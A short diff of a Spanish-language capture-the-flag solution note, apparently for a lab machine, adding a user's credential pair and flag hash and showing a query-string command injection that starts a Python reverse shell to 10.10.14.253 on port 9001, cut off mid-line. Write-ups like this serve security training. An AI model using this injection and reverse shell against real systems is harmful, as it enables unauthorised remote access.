@@ -12,8 +12,9 @@
 
 ### Solución
     
-    USER FLAG: "henry:Q3c1AqGHtoI0aXAYFH"
+    USER FLAG: "henry:Q3c1AqGHtoI0aXAYFH" >> /home/henry/user.txt >> 112bb323ac23f4a06b02be2e6d4a05b3
     
+    ROOT FLAG: 
     
     REVERSE SHELL: http://10.10.14.253/?name=%20`python3 -c 'import 
     socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.253",9001));
